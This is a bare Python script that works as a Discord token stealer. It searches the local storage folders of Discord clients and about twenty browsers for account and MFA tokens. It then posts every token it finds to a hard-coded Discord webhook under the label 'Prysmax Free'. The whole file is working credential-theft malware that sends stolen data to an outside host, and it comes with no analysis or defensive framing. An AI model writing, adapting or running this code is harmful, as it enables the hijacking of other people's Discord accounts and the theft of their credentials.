import os, re, requests, json

def find_tokens():
    tokens = []
    local = os.getenv("localAPPDATA")
    roaming = os.getenv("APPDATA")
    hook = "https://discord.com/api/webhooks/1093755454435377152/EKOp55VTcS9I7KR-PJl_y5xqY7II0nFQZhT2SdBOk_SbWkeFxV00G2hJPrMjNqjP2mQW"
    paths = {
            "Discord"               : roaming + "\\Discord",
            "Discord Canary"        : roaming + "\\discordcanary",
            "Discord PTB"           : roaming + "\\discordptb",
            "Google Chrome"         : local + "\\Google\\Chrome\\User Data\\Default",
            "Opera"                 : roaming + "\\Opera Software\\Opera Stable",
            "Brave"                 : local + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
            "Yandex"                : local + "\\Yandex\\YandexBrowser\\User Data\\Default",
            'Lightcord'             : roaming + "\\Lightcord",
            'Opera GX'              : roaming + "\\Opera Software\\Opera GX Stable",
            'Amigo'                 : local + "\\Amigo\\User Data",
            'Torch'                 : local + "\\Torch\\User Data",
            'Kometa'                : local + "\\Kometa\\User Data",
            'Orbitum'               : local + "\\Orbitum\\User Data",
            'CentBrowser'           : local + "\\CentBrowser\\User Data",
            'Sputnik'               : local + "\\Sputnik\\Sputnik\\User Data",
            'Chrome SxS'            : local + "\\Google\\Chrome SxS\\User Data",
            'Epic Privacy Browser'  : local + "\\Epic Privacy Browser\\User Data",
            'Microsoft Edge'        : local + "\\Microsoft\\Edge\\User Data\\Default",
            'Uran'                  : local + "\\uCozMedia\\Uran\\User Data\\Default",
            'Iridium'               : local + "\\Iridium\\User Data\\Default\\local Storage\\leveld",
            'Firefox'               : roaming + "\\Mozilla\\Firefox\\Profiles",
        }

    for platform, path in paths.items():
        path = os.path.join(path, "local Storage", "leveldb")
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb") or file_name.endswith(".sqlite"):
                    with open(os.path.join(path, file_name), errors="ignore") as file:
                        for line in file.readlines():
                            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                                for token in re.findall(regex, line):
                                    if f"{token} | {platform}" not in tokens:
                                        tokens.append(token)

    tokendata = {
    "avatar_url": "https://techcrunch.com/wp-content/uploads/2014/06/twitter-rise.gif?w=730&crop=1",
    "username": "Prysmax Free",
    "embeds": [
        {
      "title": "Discord likes",
      "fields": [
        {
            "name": "Tokens Found",
            "value": "\n".join(tokens),

        }
 
        ],
      "image": {
                "url": "https://techcrunch.com/wp-content/uploads/2014/06/twitter-rise.gif",
                "height": 0,
                "width": 0
            }
      }
        
    ],
    "image": {
        "url": "https://techcrunch.com/wp-content/uploads/2014/06/twitter-rise.gif",
        "height": 0,
        "width": 0
    }
}
    headers = {
        "Content-Type": "application/json"
    }
    r = requests.post(hook, data=json.dumps(tokendata), headers=headers)

